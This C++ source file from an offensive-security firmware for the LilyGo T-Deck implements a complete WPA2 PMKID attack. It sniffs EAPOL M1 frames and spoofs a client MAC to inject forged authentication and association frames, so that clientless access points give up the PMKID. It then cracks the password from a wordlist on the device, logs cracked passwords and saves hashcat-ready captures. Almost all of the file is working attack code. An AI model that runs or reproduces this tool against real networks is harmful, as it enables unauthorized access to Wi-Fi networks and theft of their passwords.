// AL-ANQA — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// PMKID attack — capture PMKID from single EAPOL M1 frame (no client needed)
// Crack: PBKDF2(SSID, pwd) → HMAC-SHA1-128(PMK, "PMK Name"||AP||STA) == captured PMKID

#include "pmkid_attack.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "lockscreen_manager.h"
#include "clock_manager.h"
#include "pcap_writer.h"
#include "beacon_build.h"
#include "dot11.h"
#include "wpa_crack.h"
#include "mac_util.h"      // randomLaMac — spoofed client identity for active solicitation
#include <esp_wifi.h>
#include <SD.h>

extern InputHandling inputHandler;
extern SDCardManager sdCardManager;

// ── PMKID state ───────────────────────────────────────────────────────────────
struct PmkidData {
    uint8_t  apMac[6];
    uint8_t  clientMac[6];
    uint8_t  pmkid[16];
    char     ssid[33];
    bool     hasPmkid;
    // Raw M1 frame buffered in RAM — written to pcap after WiFi teardown (GDMA rule)
    uint8_t  m1Raw[256];
    uint16_t m1RawLen;
    uint32_t m1Ts;
};
static PmkidData g_pm;

// ── Ring buffer (ISR → main loop) ─────────────────────────────────────────────
#define PM_RING_SIZE 8
#define PM_FRAME_MAX 256

struct PmFrame {
    uint8_t  data[PM_FRAME_MAX];
    uint16_t len;
    uint32_t ts_ms;
};
static volatile PmFrame pmRing[PM_RING_SIZE];
static volatile uint8_t pmHead      = 0;
static volatile uint8_t pmTail      = 0;
static volatile uint8_t g_pmBssid[6];
static volatile bool    g_pmCapture = false;

// ── PMKID extraction from EAPOL M1 Key Data ──────────────────────────────────
// PMKID KDE format inside Key Data: DD 14 00:0F:AC 04 <16 bytes PMKID>
// Offsets within eapol[] (from start of EAPOL header):
//   [97-98] key data length (big-endian)
//   [99+]   key data (plain in M1 — no encryption before PTK)
static bool extractPmkid(const uint8_t* eapol, int eapolAvail, uint8_t* out) {
    if (eapolAvail < 101) return false;
    uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];
    // clamp to actual available bytes
    if ((int)(99 + kdLen) > eapolAvail) kdLen = (uint16_t)(eapolAvail - 99);
    if (kdLen < 22) return false;

    const uint8_t* kd = eapol + 99;
    int remaining = (int)kdLen;

    while (remaining >= 22) {
        // KDE: type(1) + len(1) + data(len)
        // PMKID KDE: DD 14 00:0F:AC 04 + 16B PMKID  (total 22 bytes)
        if (kd[0] == 0xDD && kd[1] >= 20 &&
            kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            memcpy(out, kd + 6, 16);
            return true;
        }
        if (kd[1] < 1) break;  // malformed KDE
        int step = (int)kd[1] + 2;
        if (step > remaining) break;
        kd += step;
        remaining -= step;
    }
    return false;
}

// ── ISR callback — filter DATA frames, capture M1 only ───────────────────────
static void IRAM_ATTR rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType) {
    if (!g_pmCapture) return;
    if (pktType != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* ppkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d   = ppkt->payload;
    uint16_t       len = ppkt->rx_ctrl.sig_len;
    if (len < 40) return;

    dot11::Eapol ev;
    if (!dot11::parseEapol(d, len, ev)) return;                       // DATA+LLC 0x888E+EAPOL-Key
    if (memcmp(dot11::dataBssid(d), (const void*)g_pmBssid, 6) != 0) return;
    if (ev.p[4] != 0x02 && ev.p[4] != 0x01) return;                  // RSN or WPA descriptor
    if (ev.msg != 1) return;                                          // M1 only (ACK set, MIC clear)

    uint8_t next = (pmHead + 1) % PM_RING_SIZE;
    if (next == pmTail) return;  // ring full — drop

    PmFrame& slot = (PmFrame&)pmRing[pmHead];
    slot.len   = len < PM_FRAME_MAX ? len : PM_FRAME_MAX;
    memcpy(slot.data, d, slot.len);
    slot.ts_ms = millis();
    pmHead = next;
}

// ── Active PMKID solicitation (clientless) ────────────────────────────────────
// The passive path above only sees a PMKID when a real client associates on its own.
// To pull one from a CLIENTLESS AP we become the client ourselves: spoof a client MAC
// (so the HW auto-ACKs the AP's replies → the AP proceeds past auth/assoc to M1),
// inject an open Authentication then an Association Request carrying a WPA2-PSK RSN IE.
// A PMKID-caching AP then sends EAPOL M1 with the PMKID KDE, which the same rxCallback
// captures. Proven ESP32 route (Sablina-Tamagotchi / HaleHound; method only). §14a.
static bool g_pmSolicit = false;

// open-system Authentication request (client→AP). Returns frame length (30).
static uint16_t pmBuildAuth(uint8_t* out, const uint8_t* ap, const uint8_t* sta) {
    uint16_t i = 0;
    out[i++] = 0xB0; out[i++] = 0x00;                 // FC: mgmt / auth
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    memcpy(out + i, ap,  6); i += 6;                  // A1 = AP (DA)
    memcpy(out + i, sta, 6); i += 6;                  // A2 = our spoofed STA (SA)
    memcpy(out + i, ap,  6); i += 6;                  // A3 = BSSID
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    out[i++] = 0x00; out[i++] = 0x00;                 // auth algorithm = open system
    out[i++] = 0x01; out[i++] = 0x00;                 // auth transaction seq = 1
    out[i++] = 0x00; out[i++] = 0x00;                 // status code = 0
    return i;
}

// Association Request (client→AP) advertising WPA2-PSK / CCMP — makes the AP send M1.
static uint16_t pmBuildAssoc(uint8_t* out, const uint8_t* ap, const uint8_t* sta, const char* ssid) {
    uint16_t i = 0;
    out[i++] = 0x00; out[i++] = 0x00;                 // FC: mgmt / assoc-request
    out[i++] = 0x00; out[i++] = 0x00;                 // duration
    memcpy(out + i, ap,  6); i += 6;                  // A1
    memcpy(out + i, sta, 6); i += 6;                  // A2
    memcpy(out + i, ap,  6); i += 6;                  // A3
    out[i++] = 0x00; out[i++] = 0x00;                 // seq
    out[i++] = 0x31; out[i++] = 0x04;                 // capability info (ESS+Privacy+ShortPre/Slot)
    out[i++] = 0x0A; out[i++] = 0x00;                 // listen interval
    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
    out[i++] = 0x01; out[i++] = 0x08;                 // Supported Rates IE
    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8B; out[i++] = 0x96;
    out[i++] = 0x24; out[i++] = 0x30; out[i++] = 0x48; out[i++] = 0x6C;
    static const uint8_t rsn[] = {                    // RSN IE: WPA2-PSK, CCMP group+pairwise
        0x30, 0x14, 0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,                       // group cipher = CCMP
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,           // pairwise = CCMP
        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,           // AKM = PSK
        0x00, 0x00                                    // RSN capabilities
    };
    memcpy(out + i, rsn, sizeof(rsn)); i += sizeof(rsn);
    return i;
}

// ── Constructor ───────────────────────────────────────────────────────────────
PmkidAttack::PmkidAttack(DisplayManager& dm, WiFiFunctions& wf, DeauthAttack& da)
    : _dm(dm), _wf(wf), _da(da) {}

// ── Helpers ───────────────────────────────────────────────────────────────────
bool PmkidAttack::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

String PmkidAttack::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(buf);
}

// ── Argument parsing ──────────────────────────────────────────────────────────
void PmkidAttack::start(char* args) {
    if (!args || !*args) {
        _dm.println("Usage:");
        _dm.println("  pm <index>              (passive)");
        _dm.println("  pm assoc <index>        (active/clientless)");
        _dm.println("  pm [assoc] <bssid> [ch]");
        _dm.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first  = strtok(buf, " ");
    // optional leading flag: `pm assoc ...` / `pm a ...` = ACTIVE clientless solicitation
    g_pmSolicit = false;
    if (first && (!strcmp(first, "assoc") || !strcmp(first, "a") || !strcmp(first, "solicit"))) {
        g_pmSolicit = true;
        first = strtok(nullptr, " ");           // advance to the real target arg
    }
    if (!first) { _dm.println("Usage: pm assoc <index|bssid> [ch]"); _dm.printCommandScreen(); return; }
    char* second = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;
    char    ssid[33] = {0};

    if (!strchr(first, ':')) {
        int idx = atoi(first);
        if (!_wf.isScanDone()) {
            _dm.println("Run scanwifi first.");
            _dm.printCommandScreen();
            return;
        }
        if (!_wf.getNetworkInfo(idx, bssid, &channel)) {
            _dm.printText("Invalid index. Max: ");
            _dm.println(_wf.getNetworkCount() - 1);
            _dm.printCommandScreen();
            return;
        }
        _wf.getNetworkSSID(idx, ssid);
    } else {
        if (!parseMac(first, bssid)) {
            _dm.println("Bad BSSID. Format: XX:XX:XX:XX:XX:XX");
            _dm.printCommandScreen();
            return;
        }
        if (second) {
            int ch = atoi(second);
            if (ch >= 1 && ch <= 13) channel = ch;
        }
    }

    run(bssid, channel, ssid);
}

// ── PMKID crack: PBKDF2 → HMAC-SHA1-128(PMK, "PMK Name"||AP||STA) ────────────
// Simpler than WPA MIC: no PRF-512, just one HMAC-SHA1, take first 16 bytes
bool PmkidAttack::tryPassword(const char* pwd,
                               mbedtls_md_context_t* ctx,
                               const mbedtls_md_info_t* sha1) {
    return wpacrack::verifyPMKID(pwd, g_pm.ssid, g_pm.apMac, g_pm.clientMac,
                                 g_pm.pmkid, ctx, sha1);
}

// ── Crack UI ──────────────────────────────────────────────────────────────────
void PmkidAttack::crack() {
    if (!g_pm.hasPmkid) {
        _dm.setTextColor(TFT_RED); _dm.println("No PMKID captured.");
        _dm.setTextColor(TFT_WHITE);
        vTaskDelay(pdMS_TO_TICKS(1500));
        return;
    }
    if (g_pm.ssid[0] == '\0') {
        _dm.setTextColor(TFT_RED); _dm.println("SSID unknown — use index mode.");
        _dm.setTextColor(TFT_WHITE);
        vTaskDelay(pdMS_TO_TICKS(1500));
        return;
    }

    // Static header (title + SSID + AP) — redrawn after a lock-screen blanks it.
    auto drawHeader = [&]() -> int32_t {
        _dm.clearScreen();
        _dm.setCursor(10, outputY);
        _dm.setTextColor(0x7BEF);    _dm.printText("[");
        _dm.setTextColor(TFT_CYAN);  _dm.printText("PMKID");
        _dm.setTextColor(0x7BEF);    _dm.printText("::");
        _dm.setTextColor(TFT_YELLOW);_dm.println("CRACK]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE); _dm.println(g_pm.ssid);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE); _dm.println(macStr(g_pm.apMac).c_str());
        _dm.printSeparator();
        return _dm.getCursorY();
    };

    drawHeader();

    char wlPath[80]; sdCardManager.resolveWordlist(SD_CFG_WORDLIST_PM, wlPath, sizeof(wlPath));  // shared → own
    bool hasWl = sdCardManager.isReady() && SD.exists(wlPath);
    bool useSD = hasWl;
    if (hasWl) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_GREEN); _dm.println("[1] SD wordlist (shared/own)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);   _dm.println("[2] Built-in (100 pwds)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_WHITE); _dm.println("Choose source:");
        char ch = 0;
        while (ch != '1' && ch != '2') ch = inputHandler.getKeyboardInput();
        useSD = (ch == '1');
        drawHeader();
    }

    int32_t tryY = _dm.getCursorY();

    mbedtls_md_context_t mdCtx;
    mbedtls_md_init(&mdCtx);
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_setup(&mdCtx, sha1, 1);  // 1 = HMAC mode

    uint32_t tried = 0, skipped = 0;
    uint32_t t0 = millis(), lastRedraw = 0;
    char found[64] = {0};
    bool done = false;

    auto redraw = [&](const char* current) {
        _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
        _dm.setCursor(10, tryY);
        _dm.setTextColor(0x7BEF); _dm.printText("Trying  ");
        _dm.setTextColor(TFT_WHITE);
        char trunc[22]; strncpy(trunc, current, 21); trunc[21] = '\0';
        _dm.println(trunc);
        uint32_t elapsed = (millis() - t0) / 1000;
        uint32_t rate = elapsed ? tried / elapsed : tried * 2;
        _dm.setCursor(10, _dm.getCursorY());
        char stat[40];
        snprintf(stat, sizeof(stat), "%-5u tried  %-4u skip  %u/s", tried, skipped, rate);
        _dm.setTextColor(0x4208); _dm.println(stat);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(useSD ? TFT_CYAN : TFT_YELLOW);
        _dm.println(useSD ? "Source: SD wordlist" : "Source: built-in (100)");
        _dm.setTextColor(TFT_WHITE);
    };

    if (useSD) {
        File wl = SD.open(wlPath, FILE_READ);
        if (wl) {
            char line[64];
            while (wl.available() && !done) {
                int i = 0;
                while (wl.available() && i < 63) {
                    char c = (char)wl.read();
                    if (c == '\r') { if (wl.available() && wl.peek() == '\n') wl.read(); break; }
                    if (c == '\n') break;
                    line[i++] = c;
                }
                line[i] = '\0';
                if (i < 8 || i > 63) { skipped++; continue; }
                tried++;
                uint32_t now = millis();
                if (LockScreenManager::getInstance().consumeJustUnlocked()) {
                    drawHeader(); tryY = _dm.getCursorY();
                    redraw(line); lastRedraw = now;
                }
                if (now - lastRedraw >= 300) {
                    lastRedraw = now;
                    redraw(line);
                    char k = inputHandler.getKeyboardInput();
                    if (k == 'q' || k == 'Q') { done = true; break; }
                    vTaskDelay(1);
                }
                if (tryPassword(line, &mdCtx, sha1)) {
                    strncpy(found, line, sizeof(found) - 1);
                    done = true;
                }
            }
            wl.close();
        } else { useSD = false; }
    }

    if (!done) {
        useSD = false;
        for (int i = 0; i < wpacrack::kBuiltinCount && !done; i++) {
            tried++;
            uint32_t now = millis();
            if (LockScreenManager::getInstance().consumeJustUnlocked()) {
                drawHeader(); tryY = _dm.getCursorY();
                redraw(wpacrack::kBuiltins[i]); lastRedraw = now;
            }
            if (now - lastRedraw >= 300) {
                lastRedraw = now;
                redraw(wpacrack::kBuiltins[i]);
                char k = inputHandler.getKeyboardInput();
                if (k == 'q' || k == 'Q') break;
                vTaskDelay(1);
            }
            if (tryPassword(wpacrack::kBuiltins[i], &mdCtx, sha1)) {
                strncpy(found, wpacrack::kBuiltins[i], sizeof(found) - 1);
                done = true;
            }
        }
    }

    mbedtls_md_free(&mdCtx);

    // Save to SD once if cracked
    if (found[0] && sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_PMKID);
        char ts[22] = "";
        ClockManager::instance().getTimestamp(ts, sizeof(ts));
        char logLine[152];
        if (ts[0])
            snprintf(logLine, sizeof(logLine), "%s,%s,%s,%s,PMKID",
                     ts, macStr(g_pm.apMac).c_str(), g_pm.ssid, found);
        else
            snprintf(logLine, sizeof(logLine), "%s,%s,%s,PMKID",
                     macStr(g_pm.apMac).c_str(), g_pm.ssid, found);
        sdCardManager.appendLine(SD_LOG_CRACKED_PM, logLine);
    }

    uint32_t elapsed = (millis() - t0) / 1000;
    uint32_t rate    = elapsed ? tried / elapsed : tried * 2;

    // Result render — repeatable so a lock-screen unlock can repaint it
    auto drawResult = [&]() {
        _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 4 + 2, TFT_BLACK);
        _dm.setCursor(10, tryY);
        if (found[0]) {
            _dm.setTextColor(TFT_GREEN); _dm.printText("[CRACKED] ");
            _dm.setTextColor(TFT_WHITE); _dm.println(found);
        } else {
            _dm.setTextColor(TFT_RED); _dm.println("No match.");
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x4208); _dm.println("Use hashcat --hash-type 22000 offline.");
        }
        _dm.setCursor(10, _dm.getCursorY());
        char stat[48];
        snprintf(stat, sizeof(stat), "%u tried, %u skip  %us (%u/s)", tried, skipped, elapsed, rate);
        _dm.setTextColor(0x4208); _dm.println(stat);
        _dm.setTextColor(TFT_WHITE);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("[q] back");
    };
    drawResult();

    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            drawHeader(); tryY = _dm.getCursorY();
            drawResult();
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

// ── Core capture loop ─────────────────────────────────────────────────────────
void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
    pmHead = pmTail = 0;
    memcpy((void*)g_pmBssid, bssid, 6);
    g_pmCapture = false;
    memset(&g_pm, 0, sizeof(g_pm));
    memcpy(g_pm.apMac, bssid, 6);
    strncpy(g_pm.ssid, ssid, 32);

    // Open pcap BEFORE WiFi mode change — GDMA rule
    bool fileOk = false;
    File pcap;
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_PMKID);
        char fname[48];
        snprintf(fname, sizeof(fname), SD_DIR_PMKID "/%02X-%02X-%02X-%02X-%02X-%02X.cap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        pcap = SD.open(fname, FILE_WRITE);
        fileOk = (bool)pcap;
        if (fileOk) pcap::writeGlobalHeader(pcap);
    }

    // WiFi: APSTA (AP iface = reliable raw injection; STA iface = our client identity)
    WiFi.mode(WIFI_MODE_APSTA);
    // ACTIVE mode: spoof a client MAC on the STA iface BEFORE the softAP comes up, so the
    // HW auto-ACKs the AP's auth/assoc replies (else the AP never reaches M1). Restored on
    // exit. Set-mac while APSTA-running is proven on this stack (karma roguehs pattern).
    uint8_t origMac[6] = {0}, staMac[6] = {0};
    if (g_pmSolicit) {
        esp_wifi_get_mac(WIFI_IF_STA, origMac);
        macutil::randomLaMac(staMac);
        esp_wifi_set_mac(WIFI_IF_STA, staMac);
    }
    WiFi.softAP("x", nullptr, channel, 1, 0, false);
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));
    g_pmCapture = true;

    // statusY is set inside fullRedraw() after separator — captured by ref in lambdas
    int32_t statusY = outputY + LINE_HEIGHT * 5;  // placeholder, overwritten by fullRedraw()

    uint32_t m1Count    = 0;
    uint32_t lastRefresh = 0;
    uint32_t lastSolicit = 0;

    auto redrawStatus = [&]() {
        _dm.fillRect(10, statusY, 310, LINE_HEIGHT * 4 + 2, TFT_BLACK);
        _dm.setCursor(10, statusY);

        if (g_pm.hasPmkid) {
            _dm.setTextColor(TFT_GREEN); _dm.println("[PMKID CAPTURED!]");
            _dm.setCursor(10, _dm.getCursorY());
            // Show first 8 bytes of PMKID as hex preview
            char hex[17];
            for (int i = 0; i < 8; i++) snprintf(hex + i * 2, 3, "%02X", g_pm.pmkid[i]);
            hex[16] = '\0';
            _dm.setTextColor(0x4208); _dm.println(hex);
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(TFT_CYAN); _dm.println("[c] crack   [q] stop");
        } else {
            char line[32];
            snprintf(line, sizeof(line), "M1 frames seen: %u", m1Count);
            _dm.setTextColor(0x7BEF); _dm.println(line);
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x4208);
            _dm.println(m1Count ? "M1 seen — no PMKID in Key Data"
                                : (g_pmSolicit ? "Soliciting M1 (assoc)..." : "Waiting for EAPOL M1..."));
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(g_pmSolicit ? TFT_YELLOW : (uint16_t)0x4208);
            _dm.println(g_pmSolicit ? "[ACTIVE clientless]  [q] stop" : "[q] stop");
        }
        _dm.setTextColor(TFT_WHITE);
    };

    // Full UI redraw — called on first draw and after unlock
    auto fullRedraw = [&]() {
        _dm.clearScreen();
        _dm.setCursor(10, outputY);
        _dm.setTextColor(0x7BEF);    _dm.printText("[");
        _dm.setTextColor(TFT_CYAN);  _dm.printText("PMKID");
        _dm.setTextColor(0x7BEF);    _dm.printText("::");
        _dm.setTextColor(TFT_YELLOW);_dm.println("CAPTURE]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("AP  "); _dm.setTextColor(TFT_WHITE); _dm.println(macStr(bssid).c_str());
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("CH  "); _dm.setTextColor(TFT_WHITE); _dm.println(channel);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("SD  ");
        if (fileOk) {
            char shortName[22];
            snprintf(shortName, sizeof(shortName), "%02X-%02X-%02X...cap", bssid[0], bssid[1], bssid[2]);
            _dm.setTextColor(TFT_GREEN); _dm.println(shortName);
        } else {
            _dm.setTextColor(TFT_RED); _dm.println("none — RAM only");
        }
        _dm.printSeparator();
        statusY = _dm.getCursorY();  // capture correct Y after separator
        redrawStatus();
    };

    fullRedraw();

    // Write M1 frame to pcap after WiFi teardown (GDMA rule — no SD during WiFi).
    // Prepend a synthesized beacon carrying the ESSID so PC tools (hcxpcapngtool /
    // hashcat -m 22000) accept the cap — an M1-only pcap has no ESSID and yields no
    // hash. Skipped when SSID is unknown (manual BSSID mode → buildBeacon returns 0).
    auto finalizePcap = [&]() {
        if (!fileOk || g_pm.m1RawLen == 0) { if (fileOk) { pcap.flush(); pcap.close(); } return; }
        uint8_t beacon[dot11::BEACON_MAX_LEN];
        uint16_t bl = dot11::buildBeacon(beacon, g_pm.ssid, g_pm.apMac, (uint8_t)channel);
        if (bl) pcap::writeRecord(pcap, beacon, bl, g_pm.m1Ts > 20 ? g_pm.m1Ts - 20 : 0);
        pcap::writeRecord(pcap, g_pm.m1Raw, g_pm.m1RawLen, g_pm.m1Ts);
        pcap.flush();
        pcap.close();
    };

    // Main loop
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        // Restore full UI after unlock
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            fullRedraw();
        }

        if ((k == 'c' || k == 'C') && g_pm.hasPmkid) {
            g_pmCapture = false;
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            esp_wifi_set_promiscuous(false);
            if (g_pmSolicit) esp_wifi_set_mac(WIFI_IF_STA, origMac);   // restore real STA MAC
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            finalizePcap();
            crack();
            _dm.printCommandScreen();
            return;
        }

        // Drain ring — extract PMKID from M1 frames
        while (pmTail != pmHead) {
            PmFrame frame;
            memcpy(&frame, (const void*)&pmRing[pmTail], sizeof(PmFrame));
            pmTail = (pmTail + 1) % PM_RING_SIZE;

            uint8_t subtype = (frame.data[0] >> 4) & 0x0F;
            int hdrLen = (subtype & 0x08) ? 26 : 24;
            if (frame.len < (uint16_t)(hdrLen + 8)) continue;

            const uint8_t* eapol = frame.data + hdrLen + 8;
            int eapolAvail = frame.len - hdrLen - 8;

            m1Count++;

            // Save first M1 raw for pcap; extract client MAC
            // M1 direction: AP→STA (FromDS=1,ToDS=0) → addr1(d+4) = client MAC (DA)
            if (g_pm.m1RawLen == 0) {
                uint16_t copyLen = frame.len < 256 ? frame.len : 256;
                memcpy(g_pm.m1Raw, frame.data, copyLen);
                g_pm.m1RawLen = copyLen;
                g_pm.m1Ts     = frame.ts_ms;
                memcpy(g_pm.clientMac, frame.data + 4, 6);  // addr1 = DA = client
            }

            // Try to extract PMKID from Key Data KDE
            if (!g_pm.hasPmkid) {
                uint8_t pmkidBuf[16];
                if (extractPmkid(eapol, eapolAvail, pmkidBuf)) {
                    memcpy(g_pm.pmkid, pmkidBuf, 16);
                    g_pm.hasPmkid = true;
                }
            }
        }

        uint32_t now = millis();

        // ACTIVE SOLICIT: pull M1/PMKID from a clientless AP — inject open Auth, then
        // (after the AP's auth-resp lands) an Assoc-Request advertising WPA2-PSK. The AP
        // replies to our spoofed STA MAC (HW-ACK'd) and sends M1 with the PMKID KDE, which
        // rxCallback captures. Re-tried every 800ms until captured. AP iface = reliable TX.
        if (g_pmSolicit && !g_pm.hasPmkid && now - lastSolicit >= 800) {
            lastSolicit = now;
            uint8_t fr[128];
            uint16_t n = pmBuildAuth(fr, (const uint8_t*)g_pmBssid, staMac);
            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
            vTaskDelay(pdMS_TO_TICKS(40));                 // let the auth-response land + be ACK'd
            n = pmBuildAssoc(fr, (const uint8_t*)g_pmBssid, staMac, g_pm.ssid);
            esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);
        }

        if (now - lastRefresh >= 300) {
            lastRefresh = now;
            redrawStatus();
        }
    }

    // Teardown
    g_pmCapture = false;
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    if (g_pmSolicit) esp_wifi_set_mac(WIFI_IF_STA, origMac);   // restore real STA MAC
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    finalizePcap();
    _dm.printCommandScreen();
}
